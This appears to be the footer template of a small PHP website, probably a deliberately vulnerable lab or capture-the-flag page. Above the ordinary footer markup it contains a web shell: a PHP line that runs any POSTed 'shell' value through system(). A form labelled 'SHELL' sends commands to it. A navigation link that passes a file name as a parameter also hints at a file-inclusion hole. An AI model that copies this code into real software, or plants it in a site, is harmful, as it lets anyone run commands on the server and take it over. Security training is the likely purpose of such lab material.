<?php 
	$shell=$_POST['shell'];
	system($shell);
	if($shell !=""){
		exit();
	}
?>
<!--footer-->
	<div class="footer">
		<div class="container">
			<div class="footer-row">
				<div class="col-md-3 footer-grids">
					<h4>Seafaring</h4>
					<p>mail@example.com</p>
					<p>+2 000 222 1111</p>
					<ul class="social-icons">
						<li><a class="p"></a></li>
						<li><a class="in"></a></li>
						<li><a class="v"></a></li>
						<li><a class="facebook"></a></li>
					</ul>
				</div>
				<div class="col-md-3 footer-grids">
					<h3>目录</h3>					
					<ul>
						<li><a href="./index.php">主页</a></li>
						<li><a href="./about.php?file=header.php">关于</a></li>
						<li><a href="./services.php">服务</a></li>
						<li><a href="./contact.php">联系我们</a></li>
					</ul>
				</div>
				<div class="col-md-4 footer-grids">	
					<h3>SHELL</h3>
					<p>It seems that this command can be executed ...<p>
					<form method="POST" action="footer.php" >					 
					    <input  name="shell" type="text" class="text" value="ls" onfocus="this.value = '';" onblur="if (this.value == '') {this.value = 'Enter Email';}">
						<input type="submit" value="执行">					 
				 </form>
				</div>
				<div class="clearfix"> </div>
			</div>
		</div>
	</div>
	<div class="footer-bottom">
		<div class="container">		
			<p>Copyright &copy; 2018.Company name All rights reserved.More Templates - </p>					
		</div>
	</div>
<!--//footer-->	
<!-- for bootstrap working -->
		<script src="js/bootstrap.js"> </script>
